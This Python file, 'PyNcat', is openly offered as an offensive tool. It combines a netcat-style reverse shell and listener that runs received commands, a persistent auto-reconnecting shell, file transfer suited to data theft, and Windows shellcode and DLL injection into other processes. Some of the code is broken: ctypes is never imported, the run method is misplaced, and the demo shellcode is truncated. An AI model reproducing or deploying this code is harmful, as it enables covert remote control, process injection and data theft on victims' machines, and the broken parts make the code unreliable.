#!/usr/bin/env python3
import argparse
import socket
import subprocess
import sys
import threading
import logging
from pathlib import Path
import tqdm
import ssl
import tempfile
import os
import time
import random

# Windows API constants
if os.name == 'nt':
    from ctypes import wintypes
    kernel32 = ctypes.windll.kernel32
    MEM_COMMIT = 0x1000
    MEM_RESERVE = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40
    PROCESS_ALL_ACCESS = 0x1F0FFF

logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] [%(levelname)s] %(message)s',
    datefmt='%H:%M:%S'
)

class PyNcat:
    def __init__(self):
        self.args = self.parse_args()
        if self.args.verbose:
            logging.getLogger().setLevel(logging.DEBUG)
        self.ssl_context = None
        if self.args.ssl:
            self.setup_ssl()

    def parse_args(self):
        parser = argparse.ArgumentParser(description="PyNcat - Better Netcat + SSL + Persistence + Injection", 
                                       formatter_class=argparse.ArgumentDefaultsHelpFormatter)
        
        group = parser.add_mutually_exclusive_group(required=True)
        group.add_argument('-l', '--listen', action='store_true', help='Listen mode')
        group.add_argument('-c', '--connect', type=str, help='Connect to target (reverse shell)')
        
        parser.add_argument('-p', '--port', type=int, required=True, help='Port number')
        
        # Core Features
        parser.add_argument('-e', '--execute', type=str, help='Execute command on connection')
        parser.add_argument('-f', '--file', type=str, help='File to upload/save')
        
        # SSL
        parser.add_argument('--ssl', action='store_true', help='Enable SSL/TLS')
        parser.add_argument('--cert', type=str, help='SSL certificate path')
        parser.add_argument('--key', type=str, help='SSL private key path')
        
        # Persistence
        parser.add_argument('--persistent', action='store_true', help='Persistent reverse shell')
        parser.add_argument('--max-retries', type=int, default=0, help='Max retries (0 = infinite)')
        parser.add_argument('--delay', type=int, default=5, help='Base retry delay (seconds)')
        
        # Process Injection (Windows only)
        parser.add_argument('--inject-pid', type=int, help='PID to inject into')
        parser.add_argument('--shellcode', type=str, help='Path to shellcode binary file')
        parser.add_argument('--dll', type=str, help='Path to DLL for injection')
        
        parser.add_argument('-v', '--verbose', action='store_true')
        
        return parser.parse_args()

    def setup_ssl(self):
        if self.args.udp:  # UDP removed for simplicity in this version
            logging.warning("[!] UDP not supported in this build.")
            self.args.ssl = False
            return

        cert_path = self.args.cert
        key_path = self.args.key

        if not cert_path or not key_path:
            logging.info("[*] Generating self-signed certificate...")
            cert_path, key_path = self.generate_self_signed_cert()

        try:
            if self.args.listen:
                self.ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                self.ssl_context.load_cert_chain(certfile=cert_path, keyfile=key_path)
            else:
                self.ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                self.ssl_context.check_hostname = False
                self.ssl_context.verify_mode = ssl.CERT_NONE
        except Exception as e:
            logging.error(f"SSL setup failed: {e}")
            sys.exit(1)

    def generate_self_signed_cert(self):
        try:
            from OpenSSL import crypto
        except ImportError:
            logging.error("[!] pip install pyOpenSSL")
            sys.exit(1)

        cert_path = "/tmp/pyncat_cert.pem"
        key_path = "/tmp/pyncat_key.pem"

        k = crypto.PKey()
        k.generate_key(crypto.TYPE_RSA, 2048)
        cert = crypto.X509()
        cert.get_subject().CN = "pyncat"
        cert.set_serial_number(1000)
        cert.gmtime_adj_notBefore(0)
        cert.gmtime_adj_notAfter(365*24*60*60)
        cert.set_issuer(cert.get_subject())
        cert.set_pubkey(k)
        cert.sign(k, 'sha256')

        with open(cert_path, "wb") as f:
            f.write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
        with open(key_path, "wb") as f:
            f.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, k))

        return cert_path, key_path

    # === PROCESS INJECTION METHODS ===
    def inject_shellcode(self, pid: int, shellcode_path: str = None):
        """Basic shellcode injection using VirtualAlloc + CreateRemoteThread"""
        if os.name != 'nt':
            logging.error("[!] Shellcode injection only supported on Windows")
            return False

        try:
            if shellcode_path and Path(shellcode_path).exists():
                with open(shellcode_path, 'rb') as f:
                    shellcode = f.read()
            else:
                # Demo MessageBox shellcode (x64) - pops "Injected!" message
                shellcode = bytes([
                    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50,
                    # ... (truncated - use real shellcode in production)
                    0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48,
                    0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
                    # Simplified demo - replace with proper shellcode
                ])
                logging.info("[*] Using built-in demo MessageBox shellcode")

            logging.info(f"[*] Injecting into PID: {pid} | Shellcode size: {len(shellcode)} bytes")

            # Open target process
            h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
            if not h_process:
                logging.error(f"[!] Failed to open process {pid}")
                return False

            # Allocate memory
            addr = kernel32.VirtualAllocEx(h_process, None, len(shellcode), 
                                         MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
            if not addr:
                logging.error("[!] Memory allocation failed")
                return False

            # Write shellcode
            written = ctypes.c_int(0)
            kernel32.WriteProcessMemory(h_process, addr, shellcode, len(shellcode), ctypes.byref(written))

            # Create remote thread
            thread_id = ctypes.c_ulong(0)
            if not kernel32.CreateRemoteThread(h_process, None, 0, addr, None, 0, ctypes.byref(thread_id)):
                logging.error("[!] CreateRemoteThread failed")
                return False

            logging.info(f"[+] Shellcode injected successfully! Thread ID: {thread_id.value}")
            return True

        except Exception as e:
            logging.error(f"Injection failed: {e}")
            return False

    def inject_dll(self, pid: int, dll_path: str):
        """Classic DLL Injection"""
        if os.name != 'nt':
            logging.error("[!] DLL injection only supported on Windows")
            return False

        if not Path(dll_path).exists():
            logging.error(f"[!] DLL not found: {dll_path}")
            return False

        try:
            dll_path = str(Path(dll_path).absolute())
            dll_len = len(dll_path) + 1

            h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
            if not h_process:
                logging.error(f"[!] Cannot open PID {pid}")
                return False

            addr = kernel32.VirtualAllocEx(h_process, None, dll_len, 
                                         MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
            
            written = ctypes.c_int(0)
            kernel32.WriteProcessMemory(h_process, addr, dll_path.encode('utf-8'), dll_len, ctypes.byref(written))

            loadlib_addr = kernel32.GetProcAddress(kernel32.GetModuleHandleA(b"kernel32.dll"), b"LoadLibraryA")
            
            thread_id = ctypes.c_ulong(0)
            if kernel32.CreateRemoteThread(h_process, None, 0, loadlib_addr, addr, 0, ctypes.byref(thread_id)):
                logging.info(f"[+] DLL injected into PID {pid} successfully!")
                return True
            else:
                logging.error("[!] CreateRemoteThread failed")
                return False

        except Exception as e:
            logging.error(f"DLL injection error: {e}")
            return False

    def execute_command(self, cmd: str) -> str:
        try:
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=15)
            return output.decode('utf-8', errors='replace')
        except Exception as e:
            return f"[!] Error: {e}\n"

    def upload_file(self, client_socket, filepath):
        try:
            with open(filepath, 'wb') as f:
                while chunk := client_socket.recv(8192):
                    f.write(chunk)
            logging.info(f"[+] File saved: {filepath}")
        except Exception as e:
            logging.error(f"Upload error: {e}")

    def send_file(self, client_socket, filepath):
        try:
            path = Path(filepath)
            filesize = path.stat().st_size
            with open(path, 'rb') as f, tqdm.tqdm(total=filesize, unit='B', unit_scale=True) as pbar:
                while chunk := f.read(8192):
                    client_socket.send(chunk)
                    pbar.update(len(chunk))
        except Exception as e:
            logging.error(f"Send error: {e}")

    def handle_client(self, client_socket, addr):
        logging.info(f"[+] Connection from {addr}")
        try:
            if self.args.execute:
                client_socket.send(self.execute_command(self.args.execute).encode())

            if self.args.file and self.args.listen:
                self.upload_file(client_socket, self.args.file)

            while True:
                client_socket.send(b"pyncat> ")
                request = client_socket.recv(8192).decode('utf-8').strip()
                if not request or request.lower() in ['exit', 'quit']:
                    break
                output = self.execute_command(request)
                client_socket.send(output.encode())
        except:
            pass
        finally:
            client_socket.close()

    def listen(self):
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind(("0.0.0.0", self.args.port))

            if self.args.ssl:
                server = self.ssl_context.wrap_socket(server, server_side=True)

            server.listen(5)
            mode = "SSL " if self.args.ssl else ""
            logging.info(f"[*] Listening on 0.0.0.0:{self.args.port} ({mode}TCP)")

            while True:
                client, addr = server.accept()
                thread = threading.Thread(target=self.handle_client, args=(client, addr), daemon=True)
                thread.start()
        except KeyboardInterrupt:
            logging.info("\n[!] Listener stopped.")
        except Exception as e:
            logging.error(f"Listener error: {e}")

    def connect_once(self):
        """Single connection attempt"""
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            if self.args.ssl:
                client = self.ssl_context.wrap_socket(client)

            logging.info(f"[*] Connecting to {self.args.connect}:{self.args.port}...")
            client.connect((self.args.connect, self.args.port))
            logging.info("[+] Connected successfully!")

            if self.args.file:
                self.send_file(client, self.args.file)
                return False  # Exit after file transfer

            # Interactive shell
            while True:
                try:
                    response = client.recv(8192).decode('utf-8', errors='replace')
                    if response:
                        print(response, end='', flush=True)

                    cmd = input()
                    if cmd.lower() in ['exit', 'quit']:
                        client.send(b'exit\n')
                        break
                    client.send((cmd + '\n').encode())
                except (ConnectionResetError, BrokenPipeError, EOFError):
                    logging.info("[!] Connection lost.")
                    return False
        except Exception as e:
            if self.args.verbose:
                logging.debug(f"Connect error: {e}")
            return False
        finally:
            client.close()
        return True

    def connect_persistent(self):
        """Persistent connection with auto-reconnect"""
        retries = 0
        while True:
            try:
                connected = self.connect_once()
                if connected and not self.args.file:
                    break  # Successful interactive session ended normally
            except KeyboardInterrupt:
                logging.info("\n[!] Persistent shell terminated by user.")
                break

            retries += 1
            if self.args.max_retries > 0 and retries > self.args.max_retries:
                logging.info("[!] Max retries reached. Exiting.")
                break

            # Exponential backoff + jitter
            delay = min(self.args.delay * (2 ** (retries % 6)), 300)  # Cap at 5 minutes
            jitter = random.uniform(0.5, 1.5)
            sleep_time = delay * jitter

            logging.info(f"[*] Reconnecting in {sleep_time:.1f}s... (Attempt {retries})")
            time.sleep(sleep_time)

        def run(self):
            """Main execution gateway mapping parameters to respective operations."""
            if self.args.connect:
                self.handle_connect()
            elif self.args.listen:
                self.handle_listen()


    def handle_connect(self):
        """Establishes an outbound TCP/SSL connection to a remote host or website."""
        target_host = self.args.connect
        target_port = self.args.port

        logging.info(f"[*] Connecting to {target_host}:{target_port}...")

        try:
            # 1. Create a standard TCP Socket
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.settimeout(10.0)

            # 2. Wrap socket with SSL if the --ssl flag is used (e.g., for HTTPS on port 443)
            if self.args.ssl:
                if not self.ssl_context:
                    self.setup_ssl()
                logging.info("[*] Wrapping socket in SSL/TLS layer...")
                # server_hostname ensures SNI is sent correctly for web servers
                client_socket = self.ssl_context.wrap_socket(
                    client_socket, 
                    server_hostname=target_host
                )

            # 3. Establish the connection
            client_socket.connect((target_host, target_port))
            client_socket.settimeout(None) # Remove timeout for interactive/streaming data
            logging.info("[+] Connected successfully!")

            # 4. Handle communication
            if self.args.file:
                # If a file upload/download option is specified
                self.handle_file_transfer(client_socket)
            else:
                # Default interactive or standard I/O stream
                self.interactive_stream(client_socket)

        except socket.timeout:
            logging.error("[!] Connection timed out.")
        except Exception as e:
            logging.error(f"[!] Connection failed: {e}")

    def interactive_stream(self, sock):
        """Handles bidirectional data transmission between stdin/stdout and the socket."""
        def receive_data():
            while True:
                try:
                    data = sock.recv(4096)
                    if not data:
                        logging.info("[*] Remote host closed the connection.")
                        break
                    sys.stdout.buffer.write(data)
                    sys.stdout.flush()
                except Exception as e:
                    logging.error(f"\n[!] Error receiving data: {e}")
                    break
            os._exit(0)

        # Start a thread to handle incoming network data continuously
        receive_thread = threading.Thread(target=receive_data, daemon=True)
        receive_thread.start()

        # Handle outgoing data from user input (stdin)
        try:
            while True:
                line = sys.stdin.readline()
                if not line:
                    break
                sock.sendall(line.encode('utf-8'))
        except KeyboardInterrupt:
            logging.info("\n[*] User interrupted connection.")
        finally:
            sock.close()

    def handle_listen(self):
        """Starts a listening socket on the specified port to accept incoming connections."""
        target_host = "0.0.0.0"  # Listen on all available network interfaces
        target_port = self.args.port

        # 1. Create and bind the server TCP socket
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            server_socket.bind((target_host, target_port))
            server_socket.listen(5)
            logging.info(f"[*] Listening on {target_host}:{target_port} ...")
        except Exception as e:
            logging.error(f"[!] Failed to bind to port {target_port}: {e}")
            sys.exit(1)

        try:
            while True:
                client_sock, client_addr = server_socket.accept()
                logging.info(f"[+] Accepted connection from {client_addr[0]}:{client_addr[1]}")

                # 2. Wrap incoming socket with SSL/TLS if requested
                if self.args.ssl:
                    if not self.ssl_context:
                        self.setup_ssl()
                    logging.info("[*] Performing SSL/TLS handshake with client...")
                    try:
                        client_sock = self.ssl_context.wrap_socket(client_sock, server_side=True)
                    except Exception as ssl_err:
                        logging.error(f"[!] SSL Handshake failed: {ssl_err}")
                        client_sock.close()
                        continue

                # 3. Route the established connection
                if self.args.file:
                    self.handle_file_transfer(client_sock)
                else:
                    self.interactive_stream(client_sock)
                    
        except KeyboardInterrupt:
            logging.info("\n[*] Listener shutting down.")
        finally:
            server_socket.close()

    def handle_file_transfer(self, sock):
        """Handles reading from or writing to a file over the socket connection."""
        file_path = Path(self.args.file)
        buffer_size = 4096

        if self.args.listen:
            # === RECEIVING A FILE (Server Mode) ===
            logging.info(f"[*] Receiving data stream into local file: {file_path}")
            try:
                with open(file_path, "wb") as f:
                    with tqdm.tqdm(unit="B", unit_scale=True, desc="Downloading") as pbar:
                        while True:
                            data = sock.recv(buffer_size)
                            if not data:
                                break  # End of stream / Connection closed cleanly
                            f.write(data)
                            pbar.update(len(data))
                logging.info(f"[+] File saved successfully to {file_path}")
            except Exception as e:
                logging.error(f"[!] Error writing file: {e}")
            finally:
                sock.close()

        else:
            # === SENDING A FILE (Client Mode) ===
            if not file_path.exists():
                logging.error(f"[!] Local file not found: {file_path}")
                sock.close()
                return

            file_size = file_path.stat().st_size
            logging.info(f"[*] Uploading {file_path} ({file_size} bytes)...")
            
            try:
                with open(file_path, "rb") as f:
                    with tqdm.tqdm(total=file_size, unit="B", unit_scale=True, desc="Uploading") as pbar:
                        while True:
                            data = f.read(buffer_size)
                            if not data:
                                break
                            sock.sendall(data)
                            pbar.update(len(data))
                logging.info("[+] File transmitted successfully.")
            except Exception as e:
                logging.error(f"[!] Error sending file: {e}")
            finally:
                # Use shutdown to notify the listener that transmission is complete
                try:
                    sock.shutdown(socket.SHUT_WR)
                except OSError:
                    pass
                sock.close()





if __name__ == "__main__":
    try:
        pyncat = PyNcat()
        pyncat.run()
    except KeyboardInterrupt:
        print("\n[!] PyNcat terminated.")
    except Exception as e:
        logging.error(f"Critical error: {e}")
